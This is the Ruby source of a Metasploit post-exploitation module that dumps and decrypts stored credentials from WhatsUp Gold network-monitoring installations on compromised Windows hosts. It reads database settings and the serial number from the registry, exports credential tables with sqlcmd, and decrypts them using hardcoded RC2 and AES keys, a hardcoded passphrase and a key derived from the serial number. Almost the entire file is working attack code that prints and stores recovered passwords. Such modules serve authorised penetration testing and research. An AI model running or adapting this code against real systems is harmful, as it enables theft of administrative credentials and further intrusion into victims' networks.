##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::MSSQL
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Registry

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WhatsUp Gold Credentials Dump',
        'Description' => %q{
          This module exports and decrypts credentials from WhatsUp Gold to a CSV file;
          it is intended as a post-exploitation module for Windows hosts with WhatsUp
          Gold installed. The module has been tested on and can successfully decrypt
          credentials from WhatsUp versions 11.0 to the latest (22.x). Extracted
          credentials are automatically added to loot.
        },
        'Author' => [
          'sshah[at]assetnote.io', # original research
          'npm[at]cesium137.io' # additional research and module
        ],
        'Platform' => [ 'win' ],
        'DisclosureDate' => '2022-11-22',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2022-29845' ],
          [ 'CVE', '2022-29846' ],
          [ 'CVE', '2022-29847' ],
          [ 'CVE', '2022-29848' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29845' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29846' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29847' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-29848' ],
          [ 'URL', 'https://blog.assetnote.io/2022/06/09/whatsup-gold-exploit/' ]
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Export WhatsUp Gold database and perform decryption'
            }
          ],
          [
            'Export',
            {
              'Description' => 'Export WhatsUp Gold database without decryption'
            }
          ],
          [
            'Decrypt',
            {
              'Description' => 'Decrypt WhatsUp Gold database export CSV file'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => false
      )
    )
    register_advanced_options([
      OptPath.new('CSV_FILE', [ false, 'Path to database export CSV file if using the decrypt action' ]),
      OptString.new('AES_SALT', [ false, 'WhatsUp Gold AES-256 encryption key salt (serial number)' ]),
      OptString.new('MSSQL_INSTANCE', [ false, 'The MSSQL instance path' ]),
      OptString.new('MSSQL_DB', [ false, 'The MSSQL database name' ])
    ])
  end

  def export_header_row
    'nCredentialTypeID,DisplayName,Description,Username,Password'
  end

  def result_header_row
    'nCredentialTypeID,DisplayName,Description,Username,Password,Method'
  end

  def wug?
    @wug_build && @wug_build > ::Rex::Version.new('0')
  end

  def x64?
    sysinfo['Architecture'] == ARCH_X64
  end

  def run
    init_module
    current_action = action.name.downcase
    if current_action == 'export' || current_action == 'dump'
      print_status('Performing export of WhatsUp Gold SQL database to CSV file')
      wug_encrypted_csv_file = export
      print_good("Encrypted WhatsUp Gold Database Dump: #{wug_encrypted_csv_file}")
    end
    if current_action == 'decrypt' || current_action == 'dump'
      wug_encrypted_csv_file ||= datastore['CSV_FILE']
      fail_with(Msf::Exploit::Failure::BadConfig, 'You must set CSV_FILE advanced option') if wug_encrypted_csv_file.nil?

      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid WUG CSV input file') unless ::File.file?(wug_encrypted_csv_file)

      print_status('Performing decryption of WhatsUp Gold SQL database')
      wug_decrypted_csv_file = decrypt(wug_encrypted_csv_file)
      print_good("Decrypted WhatsUp Gold Database Dump: #{wug_decrypted_csv_file}")
    end
  end

  def export
    csv = dump_wug_db
    print_good("#{csv.count} WUG rows exported, #{@wug_total_secrets} unique nCredentialTypeIDs")
    encrypted_data = csv.to_s.delete("\000")
    store_loot('whatsup_gold_enc', 'text/csv', rhost, encrypted_data, "#{@wug_db_name}.csv", 'Encrypted WUG Database Dump')
  end

  def decrypt(csv_file)
    csv = read_csv_file(csv_file)
    print_good("#{csv.count} WUG rows loaded, #{@wug_total_secrets} unique nCredentialTypeIDs")
    result = decrypt_wug_db(csv)
    processed_rows = result[:processed_rows]
    blank_rows = result[:blank_rows]
    decrypted_rows = result[:decrypted_rows]
    plaintext_rows = result[:plaintext_rows]
    failed_rows = result[:failed_rows]
    result_rows = result[:result_csv]
    fail_with(Msf::Exploit::Failure::Unknown, 'Failed to decrypt WUG CSV dataset') unless result_rows

    total_result_rows = result_rows.count - 1 # Do not count header row
    total_result_secrets = result_rows['nCredentialTypeID'].uniq.count - 1
    if processed_rows == failed_rows || total_result_rows <= 0
      fail_with(Msf::Exploit::Failure::NoTarget, 'No rows could be processed')
    elsif failed_rows > 0
      print_warning("#{processed_rows} WUG rows processed (#{failed_rows} rows failed)")
    else
      print_good("#{processed_rows} WUG rows processed")
    end
    total_records = decrypted_rows + plaintext_rows
    print_status("#{total_records} rows recovered: #{plaintext_rows} plaintext, #{decrypted_rows} decrypted (#{blank_rows} blank)")
    decrypted_data = result_rows.to_s.delete("\000")
    print_status("#{total_result_rows} rows written (#{blank_rows} blank rows withheld)")
    print_good("#{total_result_secrets} unique WUG nCredentialTypeID records recovered")
    plunder(result_rows)
    store_loot('whatsup_gold_dec', 'text/csv', rhost, decrypted_data, "#{@wug_db_name}.csv", 'Decrypted WUG Database Dump')
  end

  def dump_wug_db
    sql_query = "SET NOCOUNT ON;
      SELECT
        ct.nCredentialTypeID nCredentialTypeID,
        CONVERT(VARBINARY(1024),ct.sDisplayName) DisplayName,
        CONVERT(VARBINARY(1024),ct.sDescription) Description,
        CONVERT(VARBINARY(1024),ctd.sName) Username,
        CONVERT(VARBINARY(4096),ctd.sValue) Password
      FROM
        [dbo].[CredentialType] AS ct
      JOIN
        [dbo].[CredentialTypeData] AS ctd ON(ct.nCredentialTypeID=ctd.nCredentialTypeID)
      WHERE
        ctd.sValue IS NOT NULL AND ctd.sValue NOT LIKE ''"
    sql_cmd = sql_prepare(sql_query)
    print_status('Export WhatsUp Gold DB ...')
    query_result = cmd_exec(sql_cmd)
    fail_with(Msf::Exploit::Failure::Unknown, query_result) if query_result.downcase.start_with?('sqlcmd: ') || query_result.downcase.start_with?('msg ')

    csv = ::CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error parsing WUG SQL dataset into CSV format') unless csv

    @wug_total_secrets = csv['nCredentialTypeID'].uniq.count
    fail_with(Msf::Exploit::Failure::Unknown, 'WUG SQL dataset contains no nCredentialTypeID column values') unless @wug_total_secrets >= 1 && !csv['nCredentialTypeID'].uniq.first.nil?

    csv
  end

  def decrypt_wug_db(csv_dataset)
    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = ::CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
    print_status('Process WhatsUp Gold DB ...')
    csv_dataset.each do |row|
      current_row += 1
      credential_id = row['nCredentialTypeID']
      if credential_id.nil? || credential_id.to_i < 1
        failed_rows += 1
        print_error("Row #{current_row} missing nCredentialTypeID column, skipping")
        next
      end
      secret_displayname = [row['DisplayName'][2..]].pack('H*').delete("\000")
      secret_description = [row['Description'][2..]].pack('H*').delete("\000")
      secret_username = [row['Username'][2..]].pack('H*').delete("\000")
      secret_ciphertext = [row['Password'][2..]].pack('H*').delete("\000")
      if secret_ciphertext.nil?
        vprint_warning("nCredentialTypeID #{credential_id} Password column nil, excluding")
        blank_rows += 1
        next
      elsif [ '1,0,0,0,', '2,0,0,0,', '3,0,0,0,' ].any? { |prefix| secret_ciphertext.start_with?(prefix) }
        plaintext = wug_decrypt(secret_ciphertext)
        secret_plaintext = plaintext['Plaintext'] if plaintext.key?('Plaintext')
        secret_disposition = plaintext['Method'] if plaintext.key?('Method')
        decrypted_rows += 1
      else
        secret_plaintext = secret_ciphertext
        secret_disposition = 'Plaintext'
        plaintext_rows += 1
      end
      if secret_plaintext.blank?
        vprint_warning("nCredentialTypeID #{credential_id} field '#{secret_username}' decrypted plaintext nil, excluding")
        blank_rows += 1
        next
      end
      unless secret_plaintext
        print_error("nCredentialTypeID #{credential_id} field '#{secret_username}' failed to decrypt")
        vprint_error(row.to_s)
        failed_rows += 1
        next
      end
      result_line = [credential_id.to_s, secret_displayname.to_s, secret_description.to_s, secret_username.to_s, secret_plaintext.to_s, secret_disposition.to_s]
      result_row = ::CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
      result_csv << result_row
      vprint_status("nCredentialTypeID #{credential_id} field '#{secret_username}' plaintext recovered: #{secret_plaintext} (#{secret_disposition})")
    end

    {
      processed_rows: current_row,
      blank_rows: blank_rows,
      decrypted_rows: decrypted_rows,
      plaintext_rows: plaintext_rows,
      failed_rows: failed_rows,
      result_csv: result_csv
    }
  end

  def init_module
    wug_hostname = get_env('COMPUTERNAME')
    print_status("Hostname #{wug_hostname} IPv4 #{rhost}")
    current_action = action.name.downcase
    require_sql = current_action == 'export' || current_action == 'dump'
    get_wug_version
    fail_with(Msf::Exploit::Failure::NoTarget, 'Target application not detected') unless wug? || current_action == 'decrypt'

    init_wug_encryption
    if require_sql
      init_wug_db
      get_sql_client
      fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'

      vprint_good("Found SQL client: #{@sql_client}")
    end
  end

  def read_csv_file(file_name)
    fail_with(Msf::Exploit::Failure::NoTarget, "CSV file #{file_name} not found") unless ::File.file?(file_name)

    csv_rows = ::File.binread(file_name)
    csv = ::CSV.parse(
      csv_rows.gsub("\r", ''),
      row_sep: :auto,
      headers: :first_row,
      quote_char: "\x00",
      skip_blanks: true,
      header_converters: ->(f) { f.strip },
      converters: ->(f) { f ? f.strip : nil }
    )
    fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv

    @wug_total_secrets = csv['nCredentialTypeID'].uniq.count
    unless @wug_total_secrets >= 1 && !csv['nCredentialTypeID'].uniq.first.nil?
      fail_with(Msf::Exploit::Failure::NoTarget, "Provided CSV file #{file_name} contains no nCredentialTypeID column values")
    end
    csv
  end

  def get_wug_version
    target_key = nil
    if x64?
      reg_keys = [
        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold\\Setup',
        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Professional\\2007\\Setup'
      ]
    else
      reg_keys = [
        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold\\Setup',
        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Professional\\2007\\Setup'
      ]
    end
    reg_keys.each do |reg_key|
      if registry_key_exist?(reg_key)
        target_key = reg_key
        break
      end
    end
    if target_key.nil?
      print_error('Unable to locate WhatsUp Gold Setup key in registry')
      @wug_build = nil
      return nil
    end
    wug_version = registry_getvaldata(target_key, 'Version').to_s
    if wug_version.nil? || wug_version.empty?
      print_error('WhatsUp Gold does not appear to be installed')
      @wug_build = nil
      return nil
    end
    @wug_build = ::Rex::Version.new(wug_version)
    if wug?
      print_status("WhatsUp Gold Build #{@wug_build}")
    else
      print_error('Error determining WhatsUp Gold version')
      @wug_build = nil
    end
  end

  def sql_prepare(sql_query)
    if @wug_db_integrated_auth
      sql_cmd_pre = "\"#{@wug_db_name}\" -S #{@wug_db_instance_path} -E"
    else
      sql_cmd_pre = "\"#{@wug_db_name}\" -S #{@wug_db_instance_path} -U \"#{@wug_db_user}\" -P \"#{@wug_db_pass}\""
    end
    "#{@sql_client} -d #{sql_cmd_pre} -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I".gsub("\r", '').gsub("\n", '')
  end

  def init_wug_db
    print_status('Init WhatsUp Gold SQL ...')
    if datastore['MSSQL_INSTANCE'] && datastore['MSSQL_DB']
      print_status('MSSQL_INSTANCE and MSSQL_DB advanced options set, connect to SQL using SSPI')
      db_instance_path = datastore['MSSQL_INSTANCE']
      db_name = datastore['MSSQL_DB']
      db_auth = 'true'
    else
      db_conf = get_wug_database_config
      db_instance_path = db_conf['SERVER']
      db_name = db_conf['INITIAL CATALOG']
      db_auth = db_conf['INTEGRATED SECURITY']
    end
    if db_instance_path.nil? || db_name.nil?
      fail_with(Msf::Exploit::Failure::BadConfig, 'Failed to recover database parameters from registry')
    end
    @wug_db_instance_path = db_instance_path
    @wug_db_name = db_name
    @wug_db_integrated_auth = false
    print_good('WhatsUp Gold SQL Database Connection Configuration:')
    print_good("\tInstance Name: #{@wug_db_instance_path}")
    print_good("\tDatabase Name: #{@wug_db_name}")
    if !db_auth.nil? && (db_auth.downcase == 'true' || db_auth.downcase == 'sspi')
      @wug_db_integrated_auth = true
      print_good("\tDatabase User: (Windows Integrated)")
      print_warning('The database uses Windows authentication')
      print_warning('Session identity must have access to the SQL server instance to proceed')
    else
      db_user = db_conf['USER ID']
      db_pass = db_conf['PASSWORD']
      @wug_db_user = db_user
      @wug_db_pass = db_pass
      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 1433,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: @wug_db_instance_path
      }
      store_valid_credential(user: @wug_db_user, private: @wug_db_pass, service_data: extra_service_data)
      print_good("\tDatabase User: #{@wug_db_user}")
      print_good("\tDatabase Pass: #{@wug_db_pass}")
    end
  end

  def get_wug_database_config
    db_str = nil
    target_key = nil
    if x64?
      reg_keys = [
        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Engine\\Database Settings',
        'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Engine\\2007\\Database Settings'
      ]
    else
      reg_keys = [
        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Engine\\Database Settings',
        'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Engine\\2007\\Database Settings'
      ]
    end
    reg_keys.each do |reg_key|
      if registry_key_exist?(reg_key)
        target_key = reg_key
        break
      end
    end
    fail_with(Msf::Exploit::Failure::NoTarget, 'Unable to locate WUG Database Settings in registry') if target_key.nil?

    reg_values = [
      'DataSource',
      'DataSource_WhatsUp'
    ]
    reg_values.each do |reg_value|
      break if (db_str = registry_getvaldata(target_key, reg_value, REGISTRY_VIEW_32_BIT).to_s.delete("\000"))
    end
    if db_str.nil? || db_str.empty?
      wug_dsn_str = registry_getvaldata(target_key, 'DSN', REGISTRY_VIEW_32_BIT).to_s.delete("\000")
      wug_dsn = wug_dsn_str.split('=')[1]
      dsn_reg_key = "HKLM\\SOFTWARE\\ODBC\\ODBC.INI\\#{wug_dsn}"
      res = parse_odbc_dsn(dsn_reg_key)
    else
      res = parse_conn_str(db_str)
    end
    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not parse database connection string') if res.nil?

    if (res.key?('INTEGRATED SECURITY') && res['INTEGRATED SECURITY'].downcase == 'false') || !res.key?('INTEGRATED SECURITY')
      mssql_login = registry_getvaldata(target_key, 'Username').to_s.delete("\000")
      mssql_pass_enc = registry_getvaldata(target_key, 'Password').unpack('C*').join(',')
      mssql_pass_plaintext = wug_decrypt(mssql_pass_enc)
      mssql_pass = mssql_pass_plaintext['Plaintext'] if mssql_pass_plaintext.key?('Plaintext')
      fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to decrypt WUG SQL login credential') if mssql_login.empty? && mssql_pass.nil?

      res['USER ID'] = mssql_login
      res['PASSWORD'] = mssql_pass
    end
    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to extract WUG SQL native login credential') unless res.count.positive?

    res
  end

  def parse_odbc_dsn(dsn_reg_key)
    return nil unless registry_key_exist?(dsn_reg_key)

    res = {}
    wug_server = registry_getvaldata(dsn_reg_key, 'Server').to_s.delete("\000")
    wug_db = registry_getvaldata(dsn_reg_key, 'Database').to_s.delete("\000")
    wug_auth = registry_getvaldata(dsn_reg_key, 'Trusted_Connection').to_s.delete("\000").downcase
    res['SERVER'] = wug_server unless wug_server.empty?
    res['INITIAL CATALOG'] = wug_db unless wug_db.empty?
    if wug_auth == 'yes'
      res['INTEGRATED SECURITY'] = 'true'
    else
      res['INTEGRATED SECURITY'] = 'false'
    end
    res
  end

  def parse_conn_str(db_str)
    res = {}
    db_connection_elements = db_str.split(';')
    db_connection_elements.each do |element|
      pair = element.to_s.split('=', 2)
      k = pair[0]
      v = pair[1]
      res[k.upcase] = v
    end
    res
  end

  def init_wug_encryption
    print_status('Init WhatsUp Gold crypto ...')

    # Static RC2-40 key "salted" with 11 bytes of 0x00 - looking at you, wincrypt.h
    @wug_rc2_key = ['112cc5a60c0000000000000000000000'].pack('H*')

    # Static AES256 key and IV derived from burned-in salt value 0x1529e3cf33795488
    @wug_aes256_key_legacy = ['5d08302a24693e074781136f12dafd9c4a41c59ce266ffa0953497cbda40ef2a'].pack('H*')
    @wug_aes256_iv_legacy = ['7d41af8fee4d2676391460f2870caea1'].pack('H*')

    # Dynamic AES256 key and IV derived from product serial number
    salt_str = datastore['AES_SALT'] if datastore.key?('AES_SALT')
    if salt_str
      unless salt_str.match?(/[A-Z0-9]+/)
        fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid serial number in AES_SALT advanced option')
      end
      print_status("Using advanced option value '#{salt_str}' to derive AES256 dynamic encryption key and IV")
      wug_salt_from_serial(salt_str)
    else
      wug_get_salt_value
    end
    if @wug_salt
      vprint_status('Compose modern AES256 key and IV ...')
      keys_modern = wug_compose_key(@wug_salt)
      @wug_aes256_key_modern = keys_modern[:aes_key]
      @wug_aes256_iv_modern = keys_modern[:aes_iv]
      aes256_modern_key_hex = @wug_aes256_key_modern.unpack('H*').first.to_s.upcase
      aes256_modern_iv_hex = @wug_aes256_iv_modern.unpack('H*').first.to_s.upcase
      add_aes_loot('WhatsUp Gold Composed AES256', aes256_modern_key_hex, aes256_modern_iv_hex)
    else
      print_warning('Could not extract dynamic encryption salt; type 3 ciphertext will not be decrypted')
    end
  end

  def wug_salt_from_serial(salt_str, store_loot: false)
    @wug_salt = wug_sha256_salt(salt_str, 8)
    wug_salt_hex = @wug_salt.unpack('H*').first.to_s.upcase
    print_good('WhatsUp Gold Dynamic Encryption Salt')
    print_good("\tHEX: #{wug_salt_hex}")
    if store_loot
      store_valid_credential(user: 'WhatsUp Gold Dynamic Encryption Salt', private: wug_salt_hex, private_type: :nonreplayable_hash)
    end
  end

  def wug_get_salt_value
    vprint_status('Get WhatsUp Gold dynamic salt from registry ...')
    reg_key = (x64? ? 'HKLM\\SOFTWARE\\WOW6432Node\\Ipswitch\\Network Monitor\\WhatsUp Gold' : 'HKLM\\SOFTWARE\\Ipswitch\\Network Monitor\\WhatsUp Gold')

    unless registry_key_exist?(reg_key)
      vprint_warning('Could not locate WhatsUp Gold registry key')
      return nil
    end

    salt_str = registry_getvaldata(reg_key, 'SerialNumber').to_s.delete("\000")
    if salt_str.blank?
      vprint_warning('Could not read SerialNumber from registry')
      return nil
    end
    print_good("WhatsUp Gold Serial Number: #{salt_str}")
    wug_salt_from_serial(salt_str, store_loot: true)
  end

  def wug_sha256_salt(salt, size)
    sha256 = ::OpenSSL::Digest.new('SHA256')
    sha256.digest(salt).unpack('C*')[0..(size - 1)].pack('C*')
  end

  def wug_compose_key(salt)
    passphrase = 'neo9ej#0!kb-YqX7^$z?@Id]_!,k9%;a}br549'
    iterations = 15
    sha1 = ::OpenSSL::Digest.new('SHA1')
    k1 = passphrase + salt
    hash = sha1.digest(k1)
    i1 = 1
    while i1 < iterations
      hash = sha1.digest(hash)
      i1 += 1
    end
    bytes = hash
    while bytes.length < 48
      k2 = hash + passphrase + salt
      hash = sha1.digest(k2)
      i2 = 1
      while i2 < iterations
        hash = sha1.digest(hash)
        i2 += 1
      end
      bytes += hash
    end
    { aes_key: bytes[0..31], aes_iv: bytes[32..47] }
  end

  def wug_decrypt(row)
    ciphertext_row = wug_parse_row(row)
    enc_type = ciphertext_row['enc_type']
    ciphertext_bytes = ciphertext_row['ciphertext']
    case enc_type
    when 1 # Static RC2-40-CBC
      plaintext = rc2_cbc_decrypt(ciphertext_bytes, @wug_rc2_key)
      return { 'Plaintext' => plaintext, 'Method' => 'Legacy' }
    when 2 # Static AES-256-CBC
      aes_key = @wug_aes256_key_legacy
      aes_iv = @wug_aes256_iv_legacy
      disposition = 'Aes256AndDefaultSalt'
    when 3 # Derived AES-256-CBC
      unless @wug_aes256_key_modern && @wug_aes256_iv_modern
        print_warning('Type 3 ciphertext encountered and no dynamic salt available, cannot decrypt')
        vprint_warning("Ciphertext: #{row}")
        return nil
      end
      aes_key = @wug_aes256_key_modern
      aes_iv = @wug_aes256_iv_modern
      disposition = 'Aes256AndDynamicSalt'
    else
      return nil
    end
    plaintext = aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
    { 'Plaintext' => plaintext, 'Method' => disposition }
  end

  def wug_parse_row(ciphertext_row)
    ciphertext_chars = ciphertext_row.split(',')
    enc_type = ciphertext_chars[0].to_i
    ciphertext_len = ciphertext_chars[4].to_i
    ciphertext_array = ciphertext_chars[8..(ciphertext_len + 8)]
    ciphertext = ciphertext_array.map(&:to_i).pack('C*')
    {
      'enc_type' => enc_type,
      'ciphertext_length' => ciphertext_len,
      'ciphertext' => ciphertext
    }
  end

  def aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
    return nil unless aes_key.length == 32 && aes_iv.length == 16

    decipher = ::OpenSSL::Cipher.new('aes-256-cbc')
    decipher.decrypt
    decipher.key = aes_key
    decipher.iv = aes_iv
    decipher.padding = 1
    (decipher.update(ciphertext_bytes) + decipher.final).delete("\000")
  rescue OpenSSL::Cipher::CipherError
    return nil
  end

  def rc2_cbc_decrypt(ciphertext_bytes, rc2_key)
    return nil unless rc2_key.length == 16

    decipher = ::OpenSSL::Cipher.new('rc2-40-cbc')
    decipher.decrypt
    decipher.padding = 1
    decipher.key_len = 16
    decipher.key = rc2_key
    (decipher.update(ciphertext_bytes) + decipher.final).delete("\000")
  rescue OpenSSL::Cipher::CipherError
    return nil
  end

  def add_aes_loot(key_desc, key_hex, iv_hex)
    key_name = "#{key_desc} key"
    iv_name = "#{key_desc} IV"
    print_good(key_desc)
    print_good("\tKEY: #{key_hex}")
    print_good("\t IV: #{iv_hex}")
    store_valid_credential(user: key_name, private: key_hex, private_type: :nonreplayable_hash)
    store_valid_credential(user: iv_name, private: iv_hex, private_type: :nonreplayable_hash)
  end

  def plunder(rowset)
    rowset.each_with_index do |row, idx|
      next if idx == 0 # Skip header row

      loot_user_col = row['Username'].split(':')
      loot_payload = row['Password']
      cred_type = loot_user_col[0]
      user_type = loot_user_col[1]
      next unless loot_payload && (user_type.downcase == 'domainanduserid' || user_type.downcase == 'username')

      row_id = row['nCredentialTypeID']
      loot_user = loot_payload
      loot_desc = row['DisplayName']
      pass_col_name = "#{cred_type}:Password"
      search_criteria = { 'nCredentialTypeID' => row_id, 'Username' => pass_col_name }
      matches = rowset.find_all do |cred|
        match = true
        search_criteria.each_key do |key|
          match &&= (cred[key] == search_criteria[key])
        end
        match
      end
      next unless matches.first

      loot_pass = matches.first['Password']
      next unless loot_pass

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 443,
        service_name: 'https',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: loot_desc
      }
      store_valid_credential(user: loot_user, private: loot_pass, service_data: extra_service_data)
      print_good("Recovered Credential: #{loot_desc}")
      print_good("\tL: #{loot_user}")
      print_good("\tP: #{loot_pass}")
    end
  end
end
